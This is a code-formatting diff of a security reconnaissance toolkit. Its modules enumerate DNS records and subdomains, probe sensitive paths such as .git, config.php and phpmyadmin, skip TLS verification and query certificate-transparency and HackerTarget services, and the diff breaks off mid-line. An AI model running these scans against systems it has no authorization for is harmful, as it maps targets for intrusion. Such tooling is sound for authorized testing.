socket.gethostbyaddr(ip)[0]\n-                    findings.append({\n-                        'type': 'dns_record',\n-                        'record_type': 'PTR',\n-                        'value': hostname,\n-                        'domain': domain\n-                    })\n+                    findings.append(\n+                        {\n+                            \"type\": \"dns_record\",\n+                            \"record_type\": \"PTR\",\n+                            \"value\": hostname,\n+                            \"domain\": domain,\n+                        }\n+                    )\n                 except:\n                     pass\n-                    \n+\n             except socket.gaierror:\n-                findings.append({\n-                    'type': 'dns_error',\n-                    'error': 'Domain resolution failed',\n-                    'domain': domain\n-                })\n-        \n+                findings.append(\n+                    {\n+                        \"type\": \"dns_error\",\n+                        \"error\": \"Domain resolution failed\",\n+                        \"domain\": domain,\n+                    }\n+                )\n+\n         duration = time.time() - start_time\n-        \n+\n         # Save results\n         output_file = output_dir / f\"dns_{domain}.json\"\n         result_data = {\n-            'target': domain,\n-            'scan_type': 'dns_enumeration',\n-            'findings': findings,\n-            'duration': duration\n+            \"target\": domain,\n+            \"scan_type\": \"dns_enumeration\",\n+            \"findings\": findings,\n+            \"duration\": duration,\n         }\n-        \n+\n         self._save_json_result(output_file, result_data)\n-        \n+\n         return ScanResult(\n             target=domain,\n-            scan_type='dns_enumeration',\n+            scan_type=\"dns_enumeration\",\n             success=True,\n             findings=findings,\n-            metadata={'records_found': len(findings)},\n-            duration=duration\n+            metadata={\"records_found\": len(findings)},\n+            duration=duration,\n         )\n-    \n+\n     def _basic_subdomain_discovery(self, domain: str, output_dir: Path) -> ScanResult:\n         \"\"\"Basic subdomain discovery using common subdomain list\"\"\"\n         start_time = time.time()\n         findings = []\n-        \n+\n         # Common subdomains to check\n         common_subdomains = [\n-            'www', 'mail', 'ftp', 'admin', 'api', 'dev', 'test', 'staging',\n-            'blog', 'shop', 'store', 'secure', 'portal', 'app', 'mobile',\n-            'vpn', 'remote', 'support', 'help', 'docs', 'wiki', 'cdn'\n+            \"www\",\n+            \"mail\",\n+            \"ftp\",\n+            \"admin\",\n+            \"api\",\n+            \"dev\",\n+            \"test\",\n+            \"staging\",\n+            \"blog\",\n+            \"shop\",\n+            \"store\",\n+            \"secure\",\n+            \"portal\",\n+            \"app\",\n+            \"mobile\",\n+            \"vpn\",\n+            \"remote\",\n+            \"support\",\n+            \"help\",\n+            \"docs\",\n+            \"wiki\",\n+            \"cdn\",\n         ]\n-        \n+\n         def check_subdomain(subdomain):\n             try:\n                 full_domain = f\"{subdomain}.{domain}\"\n                 ip = socket.gethostbyname(full_domain)\n-                return {'subdomain': full_domain, 'ip': ip}\n+                return {\"subdomain\": full_domain, \"ip\": ip}\n             except socket.gaierror:\n                 return None\n-        \n+\n         # Concurrent subdomain checking\n         with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:\n-            futures = [executor.submit(check_subdomain, sub) for sub in common_subdomains]\n+            futures = [\n+                executor.submit(check_subdomain, sub) for sub in common_subdomains\n+            ]\n             for future in concurrent.futures.as_completed(futures):\n                 result = future.result()\n                 if result:\n-                    findings.append({\n-                        'type': 'subdomain',\n-                        'subdomain': result['subdomain'],\n-                        'ip': result['ip']\n-                    })\n-        \n+                    findings.append(\n+                        {\n+                            \"type\": \"subdomain\",\n+                            \"subdomain\": result[\"subdomain\"],\n+                            \"ip\": result[\"ip\"],\n+                        }\n+                    )\n+\n         duration = time.time() - start_time\n-        \n+\n         # Save results\n         output_file = output_dir / f\"subdomains_{domain}.json\"\n         result_data = {\n-            'target': domain,\n-            'scan_type': 'subdomain_discovery',\n-            'findings': findings,\n-            'duration': duration\n+            \"target\": domain,\n+            \"scan_type\": \"subdomain_discovery\",\n+            \"findings\": findings,\n+            \"duration\": duration,\n         }\n-        \n+\n         self._save_json_result(output_file, result_data)\n-        \n+\n         return ScanResult(\n             target=domain,\n-            scan_type='subdomain_discovery',\n+            scan_type=\"subdomain_discovery\",\n             success=True,\n             findings=findings,\n-            metadata={'subdomains_found': len(findings), 'checked_subdomains': len(common_subdomains)},\n-            duration=duration\n+            metadata={\n+                \"subdomains_found\": len(findings),\n+                \"checked_subdomains\": len(common_subdomains),\n+            },\n+            duration=duration,\n         )\n-    \n+\n     def _scan_web_service(self, url: str, output_dir: Path) -> List[ScanResult]:\n         \"\"\"Scan web service for basic information\"\"\"\n         results = []\n-        \n+\n         # HTTP response analysis\n         results.append(self._http_response_analysis(url, output_dir))\n-        \n+\n         # SSL/TLS analysis for HTTPS\n-        if url.startswith('https://'):\n+        if url.startswith(\"https://\"):\n             results.append(self._ssl_analysis(url, output_dir))\n-        \n+\n         # Directory enumeration\n         results.append(self._basic_directory_enum(url, output_dir))\n-        \n+\n         return [r for r in results if r is not None]\n-    \n+\n     def _http_response_analysis(self, url: str, output_dir: Path) -> ScanResult:\n         \"\"\"Analyze HTTP response\"\"\"\n         start_time = time.time()\n         findings = []\n-        \n+\n         try:\n-            response = self.session.get(url, timeout=10, verify=False, allow_redirects=True)\n-            \n+            response = self.session.get(\n+                url, timeout=10, verify=False, allow_redirects=True\n+            )\n+\n             # Server information\n-            server = response.headers.get('Server', 'Unknown')\n-            findings.append({\n-                'type': 'server_info',\n-                'server': server,\n-                'status_code': response.status_code\n-            })\n-            \n+            server = response.headers.get(\"Server\", \"Unknown\")\n+            findings.append(\n+                {\n+                    \"type\": \"server_info\",\n+                    \"server\": server,\n+                    \"status_code\": response.status_code,\n+                }\n+            )\n+\n             # Security headers analysis\n             security_headers = [\n-                'X-Content-Type-Options',\n-                'X-Frame-Options',\n-                'X-XSS-Protection',\n-                'Strict-Transport-Security',\n-                'Content-Security-Policy'\n+                \"X-Content-Type-Options\",\n+                \"X-Frame-Options\",\n+                \"X-XSS-Protection\",\n+                \"Strict-Transport-Security\",\n+                \"Content-Security-Policy\",\n             ]\n-            \n+\n             missing_headers = []\n             present_headers = []\n-            \n+\n             for header in security_headers:\n                 if header in response.headers:\n                     present_headers.append(header)\n-                    findings.append({\n-                        'type': 'security_header',\n-                        'header': header,\n-                        'value': response.headers[header],\n-                        'status': 'present'\n-                    })\n+                    findings.append(\n+                        {\n+                            \"type\": \"security_header\",\n+                            \"header\": header,\n+                            \"value\": response.headers[header],\n+                            \"status\": \"present\",\n+                        }\n+                    )\n                 else:\n                     missing_headers.append(header)\n-                    findings.append({\n-                        'type': 'security_header',\n-                        'header': header,\n-                        'status': 'missing'\n-                    })\n-            \n+                    findings.append(\n+                        {\n+                            \"type\": \"security_header\",\n+                            \"header\": header,\n+                            \"status\": \"missing\",\n+                        }\n+                    )\n+\n             # Technology detection\n             tech_indicators = {\n-                'PHP': ['X-Powered-By: PHP', 'Set-Cookie: PHPSESSID'],\n-                'ASP.NET': ['X-AspNet-Version', 'X-AspNetMvc-Version'],\n-                'Apache': ['Server: Apache'],\n-                'Nginx': ['Server: nginx'],\n-                'IIS': ['Server: Microsoft-IIS'],\n-                'WordPress': ['wp-content', 'wp-includes'],\n-                'jQuery': ['jquery']\n+                \"PHP\": [\"X-Powered-By: PHP\", \"Set-Cookie: PHPSESSID\"],\n+                \"ASP.NET\": [\"X-AspNet-Version\", \"X-AspNetMvc-Version\"],\n+                \"Apache\": [\"Server: Apache\"],\n+                \"Nginx\": [\"Server: nginx\"],\n+                \"IIS\": [\"Server: Microsoft-IIS\"],\n+                \"WordPress\": [\"wp-content\", \"wp-includes\"],\n+                \"jQuery\": [\"jquery\"],\n             }\n-            \n+\n             response_text = response.text.lower()\n             headers_text = str(response.headers).lower()\n-            \n+\n             for tech, indicators in tech_indicators.items():\n                 for indicator in indicators:\n-                    if indicator.lower() in headers_text or indicator.lower() in response_text:\n-                        findings.append({\n-                            'type': 'technology',\n-                            'technology': tech,\n-                            'indicator': indicator\n-                        })\n+                    if (\n+                        indicator.lower() in headers_text\n+                        or indicator.lower() in response_text\n+                    ):\n+                        findings.append(\n+                            {\n+                                \"type\": \"technology\",\n+                                \"technology\": tech,\n+                                \"indicator\": indicator,\n+                            }\n+                        )\n                         break\n-            \n+\n             success = True\n-            \n+\n         except Exception as e:\n-            findings.append({\n-                'type': 'error',\n-                'error': str(e)\n-            })\n+            findings.append({\"type\": \"error\", \"error\": str(e)})\n             success = False\n-        \n+\n         duration = time.time() - start_time\n-        \n+\n         # Save results\n         parsed_url = urlparse(url)\n         safe_filename = f\"http_{parsed_url.hostname}_{parsed_url.port or ('443' if parsed_url.scheme == 'https' else '80')}.json\"\n         output_file = output_dir / safe_filename\n-        \n+\n         result_data = {\n-            'target': url,\n-            'scan_type': 'http_analysis',\n-            'findings': findings,\n-            'duration': duration\n+            \"target\": url,\n+            \"scan_type\": \"http_analysis\",\n+            \"findings\": findings,\n+            \"duration\": duration,\n         }\n-        \n+\n         self._save_json_result(output_file, result_data)\n-        \n+\n         return ScanResult(\n             target=url,\n-            scan_type='http_analysis',\n+            scan_type=\"http_analysis\",\n             success=success,\n             findings=findings,\n-            metadata={'findings_count': len(findings)},\n-            duration=duration\n+            metadata={\"findings_count\": len(findings)},\n+            duration=duration,\n         )\n-    \n+\n     def _ssl_analysis(self, url: str, output_dir: Path) -> ScanResult:\n         \"\"\"Basic SSL/TLS analysis\"\"\"\n         start_time = time.time()\n         findings = []\n-        \n+\n         try:\n             parsed = urlparse(url)\n             hostname = parsed.hostname\n             port = parsed.port or 443\n-            \n+\n             # Get SSL certificate\n             context = ssl.create_default_context()\n             context.check_hostname = False\n             context.verify_mode = ssl.CERT_NONE\n-            \n+\n             with socket.create_connection((hostname, port), timeout=10) as sock:\n                 with context.wrap_socket(sock, server_hostname=hostname) as ssock:\n                     cert = ssock.getpeercert()\n-                    \n-                    findings.append({\n-                        'type': 'ssl_certificate',\n-                        'subject': dict(x[0] for x in cert['subject']),\n-                        'issuer': dict(x[0] for x in cert['issuer']),\n-                        'not_before': cert['notBefore'],\n-                        'not_after': cert['notAfter'],\n-                        'version': cert['version']\n-                    })\n-                    \n+\n+                    findings.append(\n+                        {\n+                            \"type\": \"ssl_certificate\",\n+                            \"subject\": dict(x[0] for x in cert[\"subject\"]),\n+                            \"issuer\": dict(x[0] for x in cert[\"issuer\"]),\n+                            \"not_before\": cert[\"notBefore\"],\n+                            \"not_after\": cert[\"notAfter\"],\n+                            \"version\": cert[\"version\"],\n+                        }\n+                    )\n+\n                     # Check for SAN (Subject Alternative Names)\n-                    if 'subjectAltName' in cert:\n-                        san_list = [name[1] for name in cert['subjectAltName']]\n-                        findings.append({\n-                            'type': 'ssl_san',\n-                            'san_names': san_list\n-                        })\n-            \n+                    if \"subjectAltName\" in cert:\n+                        san_list = [name[1] for name in cert[\"subjectAltName\"]]\n+                        findings.append({\"type\": \"ssl_san\", \"san_names\": san_list})\n+\n             success = True\n-            \n+\n         except Exception as e:\n-            findings.append({\n-                'type': 'ssl_error',\n-                'error': str(e)\n-            })\n+            findings.append({\"type\": \"ssl_error\", \"error\": str(e)})\n             success = False\n-        \n+\n         duration = time.time() - start_time\n-        \n+\n         # Save results\n         parsed_url = urlparse(url)\n         safe_filename = f\"ssl_{parsed_url.hostname}.json\"\n         output_file = output_dir / safe_filename\n-        \n+\n         result_data = {\n-            'target': url,\n-            'scan_type': 'ssl_analysis',\n-            'findings': findings,\n-            'duration': duration\n+            \"target\": url,\n+            \"scan_type\": \"ssl_analysis\",\n+            \"findings\": findings,\n+            \"duration\": duration,\n         }\n-        \n+\n         self._save_json_result(output_file, result_data)\n-        \n+\n         return ScanResult(\n             target=url,\n-            scan_type='ssl_analysis',\n+            scan_type=\"ssl_analysis\",\n             success=success,\n             findings=findings,\n-            metadata={'cert_info': len([f for f in findings if f['type'] == 'ssl_certificate'])},\n-            duration=duration\n+            metadata={\n+                \"cert_info\": len(\n+                    [f for f in findings if f[\"type\"] == \"ssl_certificate\"]\n+                )\n+            },\n+            duration=duration,\n         )\n-    \n+\n     def _basic_directory_enum(self, url: str, output_dir: Path) -> ScanResult:\n         \"\"\"Basic directory enumeration\"\"\"\n         start_time = time.time()\n         findings = []\n-        \n+\n         # Common directories and files to check\n         common_paths = [\n-            'admin', 'administrator', 'login', 'wp-admin', 'phpmyadmin',\n-            'robots.txt', 'sitemap.xml', '.htaccess', 'config.php',\n-            'backup', 'test', 'dev', 'api', 'api/v1', 'api/v2',\n-            '.git', '.svn', 'changelog.txt', 'readme.txt'\n+            \"admin\",\n+            \"administrator\",\n+            \"login\",\n+            \"wp-admin\",\n+            \"phpmyadmin\",\n+            \"robots.txt\",\n+            \"sitemap.xml\",\n+            \".htaccess\",\n+            \"config.php\",\n+            \"backup\",\n+            \"test\",\n+            \"dev\",\n+            \"api\",\n+            \"api/v1\",\n+            \"api/v2\",\n+            \".git\",\n+            \".svn\",\n+            \"changelog.txt\",\n+            \"readme.txt\",\n         ]\n-        \n+\n         def check_path(path):\n             try:\n                 test_url = f\"{url.rstrip('/')}/{path}\"\n-                response = self.session.head(test_url, timeout=5, verify=False, allow_redirects=False)\n+                response = self.session.head(\n+                    test_url, timeout=5, verify=False, allow_redirects=False\n+                )\n                 if response.status_code in [200, 301, 302, 403]:\n                     return {\n-                        'path': path,\n-                        'status_code': response.status_code,\n-                        'url': test_url\n+                        \"path\": path,\n+                        \"status_code\": response.status_code,\n+                        \"url\": test_url,\n                     }\n             except:\n                 pass\n             return None\n-        \n+\n         # Concurrent path checking\n         with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:\n             futures = [executor.submit(check_path, path) for path in common_paths]\n             for future in concurrent.futures.as_completed(futures):\n                 result = future.result()\n                 if result:\n-                    findings.append({\n-                        'type': 'directory_enum',\n-                        'path': result['path'],\n-                        'status_code': result['status_code'],\n-                        'url': result['url']\n-                    })\n-        \n+                    findings.append(\n+                        {\n+                            \"type\": \"directory_enum\",\n+                            \"path\": result[\"path\"],\n+                            \"status_code\": result[\"status_code\"],\n+                            \"url\": result[\"url\"],\n+                        }\n+                    )\n+\n         duration = time.time() - start_time\n-        \n+\n         # Save results\n         parsed_url = urlparse(url)\n         safe_filename = f\"direnum_{parsed_url.hostname}.json\"\n         output_file = output_dir / safe_filename\n-        \n+\n         result_data = {\n-            'target': url,\n-            'scan_type': 'directory_enumeration',\n-            'findings': findings,\n-            'duration': duration\n+            \"target\": url,\n+            \"scan_type\": \"directory_enumeration\",\n+            \"findings\": findings,\n+            \"duration\": duration,\n         }\n-        \n+\n         self._save_json_result(output_file, result_data)\n-        \n+\n         return ScanResult(\n             target=url,\n-            scan_type='directory_enumeration',\n+            scan_type=\"directory_enumeration\",\n             success=True,\n             findings=findings,\n-            metadata={'paths_found': len(findings), 'paths_checked': len(common_paths)},\n-            duration=duration\n+            metadata={\"paths_found\": len(findings), \"paths_checked\": len(common_paths)},\n+            duration=duration,\n         )\n-    \n+\n     def _is_port_open(self, ip: str, port: int) -> bool:\n         \"\"\"Check if a port is open\"\"\"\n         try:\n             with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:\n                 sock.settimeout(3)\n                 result = sock.connect_ex((ip, port))\n                 return result == 0\n         except:\n             return False\n-    \n+\n     def _guess_service(self, port: int) -> str:\n         \"\"\"Guess service running on port\"\"\"\n         services = {\n-            21: 'FTP',\n-            22: 'SSH',\n-            23: 'Telnet',\n-            25: 'SMTP',\n-            53: 'DNS',\n-            80: 'HTTP',\n-            110: 'POP3',\n-            143: 'IMAP',\n-            443: 'HTTPS',\n-            993: 'IMAPS',\n-            995: 'POP3S',\n-            8080: 'HTTP-Alt',\n-            8443: 'HTTPS-Alt'\n+            21: \"FTP\",\n+            22: \"SSH\",\n+            23: \"Telnet\",\n+            25: \"SMTP\",\n+            53: \"DNS\",\n+            80: \"HTTP\",\n+            110: \"POP3\",\n+            143: \"IMAP\",\n+            443: \"HTTPS\",\n+            993: \"IMAPS\",\n+            995: \"POP3S\",\n+            8080: \"HTTP-Alt\",\n+            8443: \"HTTPS-Alt\",\n         }\n-        return services.get(port, 'Unknown')\n-    \n+        return services.get(port, \"Unknown\")\n+\n     def _save_json_result(self, file_path: Path, data: Dict):\n         \"\"\"Save JSON result to file\"\"\"\n         try:\n             file_path.parent.mkdir(parents=True, exist_ok=True)\n-            with open(file_path, 'w') as f:\n+            with open(file_path, \"w\") as f:\n                 json.dump(data, f, indent=2, default=str)\n         except Exception as e:\n             print(f\"Failed to save result to {file_path}: {e}\")\n+\n \n # Integration with enhanced scanning\n def run_fallback_scan(targets: List[str], output_dir: Path) -> Tuple[bool, int]:\n     \"\"\"Run fallback scan and return success status and findings count\"\"\"\n     scanner = FallbackScanner()\n     total_findings = 0\n     successful_targets = 0\n-    \n+\n     for target in targets:\n         try:\n             results = scanner.scan_target(target, output_dir)\n             if results:\n                 successful_targets += 1\n                 total_findings += sum(len(r.findings) for r in results)\n         except Exception as e:\n             print(f\"Fallback scan failed for {target}: {e}\")\n-    \n+\n     success_rate = successful_targets / len(targets) if targets else 0\n     return success_rate >= 0.7, total_findings  # 70% success threshold\n+\n \n if __name__ == \"__main__\":\n     # Test fallback scanner\n     scanner = FallbackScanner()\n     output_dir = Path(\"/tmp/fallback_test\")\n-    \n+\n     test_targets = [\"example.com\", \"8.8.8.8\"]\n-    \n+\n     for target in test_targets:\n         print(f\"Testing {target}...\")\n         results = scanner.scan_target(target, output_dir)\n-        \n+\n         for result in results:\n             print(f\"  {result.scan_type}: {len(result.findings)} findings\")\n-    \n-    print(f\"Results saved to: {output_dir}\")\n\\ No newline at end of file\n+\n+    print(f\"Results saved to: {output_dir}\")\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/plugins/advanced_osint.py\t2025-09-14 19:10:58.579755+00:00\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/plugins/advanced_osint.py\t2025-09-14 19:23:12.174226+00:00\n@@ -12,295 +12,294 @@\n     \"description\": \"Enhanced open-source intelligence gathering with multiple data sources\",\n     \"version\": \"1.0.0\",\n     \"author\": \"@cxb3rf1lth\",\n     \"category\": \"reconnaissance\",\n     \"requires_internet\": True,\n-    \"risk_level\": \"low\"\n+    \"risk_level\": \"low\",\n }\n+\n \n def execute(run_dir: Path, env: Dict[str, str], cfg: Dict[str, Any]):\n     \"\"\"Execute advanced OSINT collection\"\"\"\n     osint_dir = run_dir / \"osint_enhanced\"\n     osint_dir.mkdir(exist_ok=True)\n-    \n+\n     # Read targets\n     targets_file = Path(__file__).parent.parent / \"targets.txt\"\n     if not targets_file.exists():\n         print(\"[OSINT] No targets file found\")\n         return\n-    \n+\n     targets = []\n-    with open(targets_file, 'r') as f:\n+    with open(targets_file, \"r\") as f:\n         for line in f:\n             target = line.strip()\n-            if target and not target.startswith('#'):\n+            if target and not target.startswith(\"#\"):\n                 targets.append(target)\n-    \n+\n     if not targets:\n         print(\"[OSINT] No targets found\")\n         return\n-    \n+\n     results = {}\n-    \n+\n     for target in targets:\n         print(f\"[OSINT] Processing target: {target}\")\n         target_results = {}\n-        \n+\n         # Extract domain\n-        if target.startswith('http'):\n+        if target.startswith(\"http\"):\n             parsed = urlparse(target)\n             domain = parsed.netloc\n         else:\n             domain = target\n-        \n+\n         # 1. Certificate Transparency Logs\n         try:\n             cert_results = search_certificate_transparency(domain)\n             target_results[\"certificate_transparency\"] = cert_results\n         except Exception as e:\n             print(f\"[OSINT] Certificate transparency error for {domain}: {e}\")\n-        \n+\n         # 2. DNS History\n         try:\n             dns_history = get_dns_history(domain)\n             target_results[\"dns_history\"] = dns_history\n         except Exception as e:\n             print(f\"[OSINT] DNS history error for {domain}: {e}\")\n-        \n+\n         # 3. Subdomain Enumeration via External Sources\n         try:\n             external_subs = get_external_subdomains(domain)\n             target_results[\"external_subdomains\"] = external_subs\n         except Exception as e:\n             print(f\"[OSINT] External subdomain error for {domain}: {e}\")\n-        \n+\n         # 4. Social Media and Code Repositories\n         try:\n             social_results = search_social_presence(domain)\n             target_results[\"social_presence\"] = social_results\n         except Exception as e:\n             print(f\"[OSINT] Social presence error for {domain}: {e}\")\n-        \n+\n         # 5. Technology Stack Analysis\n         try:\n             tech_stack = analyze_technology_stack(target)\n             target_results[\"technology_analysis\"] = tech_stack\n         except Exception as e:\n             print(f\"[OSINT] Technology analysis error for {target}: {e}\")\n-        \n+\n         results[target] = target_results\n-    \n+\n     # Save comprehensive results\n     output_file = osint_dir / \"advanced_osint_results.json\"\n-    with open(output_file, 'w') as f:\n+    with open(output_file, \"w\") as f:\n         json.dump(results, f, indent=2, default=str)\n-    \n+\n     print(f\"[OSINT] Advanced OSINT results saved to: {output_file}\")\n+\n \n def search_certificate_transparency(domain):\n     \"\"\"Search certificate transparency logs for subdomains\"\"\"\n-    results = {\n-        \"subdomains_found\": [],\n-        \"certificates\": [],\n-        \"timestamp\": time.time()\n-    }\n-    \n+    results = {\"subdomains_found\": [], \"certificates\": [], \"timestamp\": time.time()}\n+\n     try:\n         # Use crt.sh API for certificate transparency\n         import urllib.request\n         import urllib.parse\n-        \n+\n         url = f\"https://crt.sh/?q=%.{domain}&output=json\"\n-        \n+\n         try:\n             with urllib.request.urlopen(url, timeout=30) as response:\n                 data = json.loads(response.read().decode())\n-                \n+\n                 subdomains = set()\n                 for cert in data[:50]:  # Limit to avoid too much data\n-                    if 'name_value' in cert:\n-                        names = cert['name_value'].split('\\n')\n+                    if \"name_value\" in cert:\n+                        names = cert[\"name_value\"].split(\"\\n\")\n                         for name in names:\n                             name = name.strip().lower()\n                             if domain in name and name.endswith(f\".{domain}\"):\n                                 subdomains.add(name)\n-                    \n-                    results[\"certificates\"].append({\n-                        \"id\": cert.get(\"id\"),\n-                        \"issuer\": cert.get(\"issuer_name\", \"\"),\n-                        \"names\": cert.get(\"name_value\", \"\").split('\\n'),\n-                        \"not_before\": cert.get(\"not_before\"),\n-                        \"not_after\": cert.get(\"not_after\")\n-                    })\n-                \n+\n+                    results[\"certificates\"].append(\n+                        {\n+                            \"id\": cert.get(\"id\"),\n+                            \"issuer\": cert.get(\"issuer_name\", \"\"),\n+                            \"names\": cert.get(\"name_value\", \"\").split(\"\\n\"),\n+                            \"not_before\": cert.get(\"not_before\"),\n+                            \"not_after\": cert.get(\"not_after\"),\n+                        }\n+                    )\n+\n                 results[\"subdomains_found\"] = list(subdomains)\n-                \n+\n         except Exception as e:\n             results[\"error\"] = str(e)\n-    \n+\n     except Exception as e:\n         results[\"error\"] = f\"Certificate transparency search failed: {e}\"\n-    \n-    return results\n+\n+    return results\n+\n \n def get_dns_history(domain):\n     \"\"\"Get DNS history information\"\"\"\n     results = {\n         \"historical_ips\": [],\n         \"mx_records\": [],\n         \"ns_records\": [],\n-        \"timestamp\": time.time()\n+        \"timestamp\": time.time(),\n     }\n-    \n+\n     try:\n         # Use dig for current DNS records\n         dns_queries = [\n             (\"A\", \"a_records\"),\n-            (\"MX\", \"mx_records\"), \n+            (\"MX\", \"mx_records\"),\n             (\"NS\", \"ns_records\"),\n             (\"TXT\", \"txt_records\"),\n-            (\"CNAME\", \"cname_records\")\n+            (\"CNAME\", \"cname_records\"),\n         ]\n-        \n+\n         for query_type, result_key in dns_queries:\n             try:\n                 cmd = [\"dig\", \"+short\", f\"@8.8.8.8\", domain, query_type]\n                 result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)\n                 if result.returncode == 0 and result.stdout.strip():\n-                    results[result_key] = result.stdout.strip().split('\\n')\n+                    results[result_key] = result.stdout.strip().split(\"\\n\")\n             except Exception:\n                 results[result_key] = []\n-    \n+\n     except Exception as e:\n         results[\"error\"] = f\"DNS history lookup failed: {e}\"\n-    \n-    return results\n+\n+    return results\n+\n \n def get_external_subdomains(domain):\n     \"\"\"Get subdomains from external sources\"\"\"\n-    results = {\n-        \"sources\": {},\n-        \"total_unique\": 0,\n-        \"timestamp\": time.time()\n-    }\n-    \n+    results = {\"sources\": {}, \"total_unique\": 0, \"timestamp\": time.time()}\n+\n     try:\n         # Use various external APIs (rate-limited)\n-        sources = [\n-            \"hackertarget\",\n-            \"threatcrowd\", \n-            \"virustotal\"\n-        ]\n-        \n+        sources = [\"hackertarget\", \"threatcrowd\", \"virustotal\"]\n+\n         all_subdomains = set()\n-        \n+\n         for source in sources:\n             try:\n                 if source == \"hackertarget\":\n                     # HackerTarget API\n                     import urllib.request\n+\n                     url = f\"https://api.hackertarget.com/hostsearch/?q={domain}\"\n-                    \n+\n                     with urllib.request.urlopen(url, timeout=15) as response:\n                         data = response.read().decode()\n                         if \"error\" not in data.lower():\n-                            lines = data.split('\\n')\n+                            lines = data.split(\"\\n\")\n                             source_subs = []\n                             for line in lines:\n-                                if ',' in line:\n-                                    subdomain = line.split(',')[0].strip()\n+                                if \",\" in line:\n+                                    subdomain = line.split(\",\")[0].strip()\n                                     if subdomain and domain in subdomain:\n                                         source_subs.append(subdomain)\n                                         all_subdomains.add(subdomain)\n-                            \n+\n                             results[\"sources\"][source] = {\n                                 \"count\": len(source_subs),\n-                                \"subdomains\": source_subs[:20]  # Limit output\n+                                \"subdomains\": source_subs[:20],  # Limit output\n                             }\n-                \n+\n                 # Add small delay between API calls\n                 time.sleep(1)\n-                \n+\n             except Exception as e:\n                 results[\"sources\"][source] = {\"error\": str(e)}\n-        \n+\n         results[\"total_unique\"] = len(all_subdomains)\n         results[\"all_subdomains\"] = list(all_subdomains)[:50]  # Limit output\n-    \n+\n     except Exception as e:\n         results[\"error\"] = f\"External subdomain enumeration failed: {e}\"\n-    \n-    return results\n+\n+    return results\n+\n \n def search_social_presence(domain):\n     \"\"\"Search for social media and code repository presence\"\"\"\n     results = {\n         \"github_repos\": [],\n         \"social_accounts\": [],\n         \"code_leaks\": [],\n-        \"timestamp\": time.time()\n+        \"timestamp\": time.time(),\n     }\n-    \n+\n     try:\n         # Search for GitHub repositories related to domain\n         github_searches = [\n             f'\"{domain}\"',\n             f'\"{domain.replace(\".\", \"\")}\"',\n-            f'site:{domain}'\n+            f\"site:{domain}\",\n         ]\n-        \n+\n         # Note: This would need GitHub API token for actual implementation\n         results[\"github_search_queries\"] = github_searches\n-        \n+\n         # Search for common social media patterns\n         social_platforms = [\"twitter\", \"facebook\", \"linkedin\", \"instagram\"]\n         for platform in social_platforms:\n             # This would be expanded with actual API calls\n-            results[\"social_accounts\"].append({\n-                \"platform\": platform,\n-                \"search_query\": f\"{domain} site:{platform}.com\",\n-                \"status\": \"manual_search_required\"\n-            })\n-    \n+            results[\"social_accounts\"].append(\n+                {\n+                    \"platform\": platform,\n+                    \"search_query\": f\"{domain} site:{platform}.com\",\n+                    \"status\": \"manual_search_required\",\n+                }\n+            )\n+\n     except Exception as e:\n         results[\"error\"] = f\"Social presence search failed: {e}\"\n-    \n-    return results\n+\n+    return results\n+\n \n def analyze_technology_stack(target):\n     \"\"\"Analyze technology stack in detail\"\"\"\n     results = {\n         \"web_technologies\": {},\n         \"server_info\": {},\n         \"cms_detection\": {},\n-        \"timestamp\": time.time()\n+        \"timestamp\": time.time(),\n     }\n-    \n+\n     try:\n         # Enhanced HTTP header analysis\n         try:\n             cmd = [\"curl\", \"-I\", \"-s\", \"-k\", \"--max-time\", \"10\", target]\n             result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)\n-            \n+\n             if result.returncode == 0:\n                 headers = {}\n-                for line in result.stdout.split('\\n'):\n-                    if ':' in line:\n-                        key, value = line.split(':', 1)\n+                for line in result.stdout.split(\"\\n\"):\n+                    if \":\" in line:\n+                        key, value = line.split(\":\", 1)\n                         headers[key.strip().lower()] = value.strip()\n-                \n+\n                 # Analyze headers for technology indicators\n                 tech_indicators = {\n                     \"server\": headers.get(\"server\", \"\"),\n                     \"x-powered-by\": headers.get(\"x-powered-by\", \"\"),\n                     \"x-aspnet-version\": headers.get(\"x-aspnet-version\", \"\"),\n                     \"x-generator\": headers.get(\"x-generator\", \"\"),\n-                    \"set-cookie\": headers.get(\"set-cookie\", \"\")\n+                    \"set-cookie\": headers.get(\"set-cookie\", \"\"),\n                 }\n-                \n+\n                 results[\"server_info\"] = tech_indicators\n-                \n+\n                 # Detect common technologies\n                 technologies = []\n                 if \"nginx\" in tech_indicators.get(\"server\", \"\").lower():\n                     technologies.append(\"Nginx\")\n                 if \"apache\" in tech_indicators.get(\"server\", \"\").lower():\n@@ -309,15 +308,15 @@\n                     technologies.append(\"PHP\")\n                 if \"asp.net\" in tech_indicators.get(\"x-powered-by\", \"\").lower():\n                     technologies.append(\"ASP.NET\")\n                 if \"jsessionid\" in tech_indicators.get(\"set-cookie\", \"\").lower():\n                     technologies.append(\"Java/JSP\")\n-                \n+\n                 results[\"web_technologies\"][\"detected\"] = technologies\n-        \n+\n         except Exception as e:\n             results[\"server_info\"][\"error\"] = str(e)\n-    \n+\n     except Exception as e:\n         results[\"error\"] = f\"Technology analysis failed: {e}\"\n-    \n-    return results\n\\ No newline at end of file\n+\n+    return results\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/performance_monitor.py\t2025-09-14 19:10:58.579755+00:00\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/performance_monitor.py\t2025-09-14 19:23:12.281568+00:00\n@@ -15,13 +15,15 @@\n from dataclasses import dataclass, field\n from collections import deque, defaultdict\n import statistics\n import logging\n \n+\n @dataclass\n class PerformanceSnapshot:\n     \"\"\"Snapshot of system performance at a point in time\"\"\"\n+\n     timestamp: datetime\n     cpu_percent: float\n     memory_percent: float\n     disk_usage_percent: float\n     network_io: Dict[str, int]\n@@ -29,262 +31,268 @@\n     success_rate: float\n     throughput: float  # operations per minute\n     error_count: int\n     response_time_avg: float\n \n+\n @dataclass\n class OptimizationRule:\n     \"\"\"Rule for automatic optimization\"\"\"\n+\n     condition: str  # Python expression to evaluate\n-    action: str    